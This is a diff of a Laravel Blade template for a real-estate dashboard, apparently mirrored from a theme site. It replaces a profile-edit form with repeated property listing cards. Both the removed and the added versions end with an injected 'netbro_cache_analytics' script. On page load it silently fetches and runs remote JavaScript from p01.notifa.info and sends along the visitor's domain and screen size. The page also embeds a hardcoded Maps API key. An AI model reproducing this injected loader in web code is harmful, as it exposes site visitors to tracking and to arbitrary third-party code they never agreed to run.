@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   
-<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-my-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:53 GMT -->
+<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-all-listing.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:47 GMT -->
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -33,13 +33,12 @@
 
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/css/dropify.min.css">
 
     <!-- Favicon -->
-    <link rel="icon" href="{{('images/favicon.png')}}">
-    <link rel="apple-touch-icon" href="{{('images/apple-touch-icon.png')}}">
-    <link rel="apple-touch-icon" sizes="72x72" href="{{('images/icon-72x72.png')}}">
-    <link rel="apple-touch-icon" sizes="114x114" href="{{('images/icon-114x114.png')}}">
+    <link rel="icon" href="{{asset('images/favicon.png')}}">
+    <link rel="apple-touch-icon" href="{{asset('images/apple-touch-icon.png')}}">
+    <link rel="apple-touch-icon" sizes="72x72" href="{{asset('images/icon-72x72.png')}}">
+    <link rel="apple-touch-icon" sizes="114x114" href="{{asset('images/icon-114x114.png')}}">
 
     <!--[if lt IE 9]>
     <script src="{{asset('assets/js/html5shiv.min.js')}}"></script>
@@ -58,19 +57,19 @@
           <div class="col-md-3">
             <div class="user-profile">
               <div class="user-thumb">
-                <img src="{{auth()->user()->photo ? asset(auth()->user()->photo) : asset('images/dashboard/user/demo-user.png')}}" class="img-responsive" alt="" style="width: 100%; height:100%; object-fit:cover">
+                <img src="{{asset('images/dashboard/user/thumb-1.jpg')}}" class="img-responsive" alt="">
                 <div class="varified">
                   <i class="fas fa-check"></i>
                 </div>
               </div>
               <div class="user-name">
-                <h5><a href="#">{{auth()->user()->name}}</a></h5>
+                <h5><a href="#">Maria K.Marlin</a></h5>
               </div>
               <div class="info">
                 <div class="profile-info">
                   <h6>85%</h6>
                   <p>Profile comp</p>
-                  <a href="#" class="button primary-bg">Edit Profil</a>
+                  <a href="#" class="button primary-bg">Edit Profile</a>
                 </div>
                 <div class="notification">
                   <h6>35</h6>
@@ -132,78 +131,214 @@
               </ul>
             </div>
           </div>
-          <div class="col-md-6">
+          <div class="col-md-6 margin-balance">
             <div class="dashboard-body-block">
-              <div class="dashboard-section-container profile-details-container">
-                <h5 class="title">Profile Details</h5>
-                <div class="section-body">
-                  <form class="user-profile-form" action="/agent" method="POST" enctype="multipart/form-data">
-                    @method('patch')
-                    @csrf
-                    <div class="form-group">
-                      <label for="">Foto</label>
-                      <input type="file" name="photo" data-max-file-size="2M" class="dropify" data-default-file="{{auth()->user()->photo ? asset(auth()->user()->photo) : asset('images/dashboard/user/demo-user.png')}}" />
+              <div class="all-listing">
+                <div class="row">
+                  <div class="col-lg-6 col-md-12 col-sm-6">
+                    <div class="listing">
+                      <div class="listing-thumb">
+                        <div class="listing-slider">
+                          <div class="slide slide-1">
+                            <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-2">
+                            <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-3">
+                            <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                        </div>
+                        <div class="overlay"></div>
+                        <div class="quick-action">
+                          <ul>
+                            <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
+                            <li><a href="#"><i class="far fa-heart"></i></a></li>
+                          </ul>
+                        </div>
+                        <div class="rate">
+                          <span>&#36;22,500.00</span>
+                        </div>
+                      </div>
+                      <div class="content-block">
+                        <div class="listing-body">
+                          <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
+                          <div class="meta">
+                            <span class="listing-type">living room</span>
+                            <span class="listing-status open">Open</span>
+                          </div>
+                          <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
+                          <div class="info">
+                            <div class="listing-info bedroom">
+                              <span class="title">Bedrooms</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info bath">
+                              <span class="title">Baths</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info size">
+                              <span class="title">Size (Sq.ft)</span>
+                              <span class="number">1650</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
                     </div>
-                    <div class="form-group">
-                      <label for="">Nama</label>
-                    <input type="text" class="form-control" value="{{auth()->user()->name}}" name="name">
+                  </div>
+                  <div class="col-lg-6 col-md-12 col-sm-6">
+                    <div class="listing">
+                      <div class="listing-thumb">
+                        <div class="listing-slider">
+                          <div class="slide slide-1">
+                            <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-2">
+                            <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-3">
+                            <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                        </div>
+                        <div class="overlay"></div>
+                        <div class="quick-action">
+                          <ul>
+                            <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
+                            <li><a href="#"><i class="far fa-heart"></i></a></li>
+                          </ul>
+                        </div>
+                        <div class="rate">
+                          <span>&#36;22,500.00</span>
+                        </div>
+                      </div>
+                      <div class="content-block">
+                        <div class="listing-body">
+                          <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
+                          <div class="meta">
+                            <span class="listing-type">living room</span>
+                            <span class="listing-status open">Open</span>
+                          </div>
+                          <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
+                          <div class="info">
+                            <div class="listing-info bedroom">
+                              <span class="title">Bedrooms</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info bath">
+                              <span class="title">Baths</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info size">
+                              <span class="title">Size (Sq.ft)</span>
+                              <span class="number">1650</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
                     </div>
-                    <div class="form-group">
-                      <label for="">NIK</label>
-                    <input type="text" class="form-control" value="{{auth()->user()->id_number}}" name="id_number">
+                  </div>
+                  <div class="col-lg-6 col-md-12 col-sm-6">
+                    <div class="listing">
+                      <div class="listing-thumb">
+                        <div class="listing-slider">
+                          <div class="slide slide-1">
+                            <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-2">
+                            <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-3">
+                            <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                        </div>
+                        <div class="overlay"></div>
+                        <div class="quick-action">
+                          <ul>
+                            <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
+                            <li><a href="#"><i class="far fa-heart"></i></a></li>
+                          </ul>
+                        </div>
+                        <div class="rate">
+                          <span>&#36;22,500.00</span>
+                        </div>
+                      </div>
+                      <div class="content-block">
+                        <div class="listing-body">
+                          <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
+                          <div class="meta">
+                            <span class="listing-type">living room</span>
+                            <span class="listing-status open">Open</span>
+                          </div>
+                          <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
+                          <div class="info">
+                            <div class="listing-info bedroom">
+                              <span class="title">Bedrooms</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info bath">
+                              <span class="title">Baths</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info size">
+                              <span class="title">Size (Sq.ft)</span>
+                              <span class="number">1650</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
                     </div>
-                    <div class="form-group">
-                      <label for="">Email</label>
-                      <input type="email" class="form-control" value="{{auth()->user()->email}}" name="email">
+                  </div>
+                  <div class="col-lg-6 col-md-12 col-sm-6">
+                    <div class="listing">
+                      <div class="listing-thumb">
+                        <div class="listing-slider">
+                          <div class="slide slide-1">
+                            <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-2">
+                            <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                          <div class="slide slide-3">
+                            <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
+                          </div>
+                        </div>
+                        <div class="overlay"></div>
+                        <div class="quick-action">
+                          <ul>
+                            <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
+                            <li><a href="#"><i class="far fa-heart"></i></a></li>
+                          </ul>
+                        </div>
+                        <div class="rate">
+                          <span>&#36;22,500.00</span>
+                        </div>
+                      </div>
+                      <div class="content-block">
+                        <div class="listing-body">
+                          <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
+                          <div class="meta">
+                            <span class="listing-type">living room</span>
+                            <span class="listing-status open">Open</span>
+                          </div>
+                          <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
+                          <div class="info">
+                            <div class="listing-info bedroom">
+                              <span class="title">Bedrooms</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info bath">
+                              <span class="title">Baths</span>
+                              <span class="number">05</span>
+                            </div>
+                            <div class="listing-info size">
+                              <span class="title">Size (Sq.ft)</span>
+                              <span class="number">1650</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
                     </div>
-                    <div class="form-group">
-                      <label for="">Nomor HP</label>
-                      <input type="text" class="form-control" value="{{auth()->user()->phone_number}}" name="phone_number">
-                    </div>
-                    <div class="form-group">
-                      <label for="">Alamat</label>
-                      <input type="text" class="form-control" value="{{auth()->user()->address}}" name="address">
-                    </div>
-
-                    <div class="form-group">
-                        <label for="">Nomor Whatsapp</label>
-                      <input id="listing" type="text" class="form-control" name="whatsapp_number">
-                    </div>
-                    <div class="form-group">
-                        <label for="">Instagram</label>
-                      <input id="" type="text" class="form-control" name="instagram_link">
-                    </div>
-                    <div class="form-group">
-                        <label for="">Facebook</label>
-                      <input id="" type="text" class="form-control" name="facebook_link">
-                    </div>
-                    <div class="form-group">
-                        <label for="">Youtube</label>
-                      <input id="" type="text" class="form-control" name="youtube_link">
-                    </div>
-                    <div class="form-group">
-                        <label for="">Twitter</label>
-                      <input id="" type="text" class="form-control" name="twitter_link">
-                    </div>
-                    <button type="submit" class="button primary-bg">Simpan</button>
-                  </form>
-                </div>
-              </div>
-              <div class="dashboard-section-container change-password-section">
-                <h4 class="title">Change Password</h4>
-                <div class="section-body">
-                  <form action="#">
-                    <div class="form-group">
-                      <input type="password" class="form-control" placeholder="Current Password">
-                    </div>
-                    <div class="form-group">
-                      <input type="password" class="form-control" placeholder="New Password">
-                    </div>
-                    <div class="form-group">
-                      <input type="password" class="form-control" placeholder="Confirm Password">
-                    </div>
-                    <button class="button primary-bg">Update Password</button>
-                  </form>
+                  </div>
                 </div>
               </div>
             </div>
@@ -226,7 +361,7 @@
                 </li>
                 <li class="activity-list">
                   <p class="time">10 Minutes ago</p>
-                  <p class="title"><a href="#">New Added</a></p>
+                  <p class="title"><a href="#">New Listing Added</a></p>
                 </li>
                 <li class="activity-list">
                   <p class="time">10 Minutes ago</p>
@@ -289,7 +424,7 @@
                   <div class="footer-listing">
                     <div class="listing-thumb">
                       <a href="#">
-                        <img src="{{('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
+                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                       </a>
                     </div>
                     <div class="body">
@@ -300,7 +435,7 @@
                   <div class="footer-listing">
                     <div class="listing-thumb">
                       <a href="#">
-                        <img src="{{('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
+                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                       </a>
                     </div>
                     <div class="body">
@@ -354,7 +489,7 @@
               <div class="footer-social-link">
                 <div class="footer-logo">
                   <a href="#">
-                    <img src="{{('images/footer-logo.svg')}}" class="img-responsive" alt="Footer Logo">
+                    <img src="{{asset('images/footer-logo.svg')}}" class="img-responsive" alt="Footer Logo">
                   </a>
                 </div>
                 <div class="social-link">
@@ -462,12 +597,7 @@
     <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
     <script src="{{asset('js/map.js')}}"></script>
     <script src="{{asset('js/searchMap.js')}}"></script>
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pLhKiZJ%2f1h3ODC7%2foPHtxMk1Og7TQF2CjihCdD11kR9VmE5ZbLWM%2bK0GMuRD1YWgDTbxDUVn9oz5tV5%2fDYUkYnvaXAuU8JHh2wnOoUxpf%2b9whVznhRVAJ1EkEoihyHI40qRPl7j41g32P8q%2bhB6mXBkrcnntMjwiZKcQfGFEeu76KKw8eMBPBeU3v5VA%2bsUw1IY5PxDqnX4FwfWpQiVSTB%2f0YV%2fYAIZdNWnOZWQFPhmjzsHc%2bp5KFCNsWN6nufu%2bTzcqIqs0VprM%2bImMoye3ORt2xHQG8YcwdLFmrdXRzP7lMYV79uzi%2f3yZxoU94GdLSi4wMsNaYJ2j%2btdjQnScvMQVfKz%2fUBvg1liEliSm1X3l%2b%2bZr7sRfuSszMA8raPjpQ43jfWooCtt7XKlLdxoV6ixfL8TInm3CYrXrOVNLgt7DwXBLtsLkulDwfMBO4uOgQ925g66QCx7urq8GGy44iBm3lpJ78HQxm4ZS7yzg3CrSTXRFxzC2aa30HbvuB3ONdc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/js/dropify.min.js"></script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJDmtm%2bxesmo0ZMegSCb3JUanBtEhdW961ElByTx5MQ7%2fU%2bOg4Fax2kO31n84DP%2fSTsLMgvIn3nLbHhFfmJSOYL0y87kzBB65nkxrkPX9h8TMwxWZbjB0M1nJ8WzSHL%2b6lBfZ9fu5vSJRt02cACRflXTaMdV54%2fV0Pr3T2IdZoluJzo%2bKL%2boyrgs2%2boVAeh5WYOEI1xe%2fnum%2b%2fVLwdWk6Vevxl7gT%2bTZRv4IjosRlBtGaRYxSFc9d8Eezgd3TSe2zKcKrpF%2fYp7de91TlvmmUPW5qAOB2c7rKjO4KcTVpuKwhS2QD9cyVC8yV%2fIbCSy81M7uHYzSKNqZT%2fYLfzOK6U9WrBfk2zCTzoOqaTDiT2uyt%2fdrWd9AX40pmzLJQPcsXDtVlVWkT6NMS1DbNnjKY063sLI3SzDWTRrxZZ%2fTL5cJ3CG50nVnzfOTVx2wyqSjHuWlIc6iRKXn4ONdsKF%2bh0ukefNbDintf6daoQGontKVeTXTq%2bDkqvUg7%2f%2fsHUJ0%2bU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
-    <script>
-      $('.dropify').dropify();
-    </script>
-
-<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-my-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:57 GMT -->
+<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-all-listing.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:48 GMT -->
 </html>
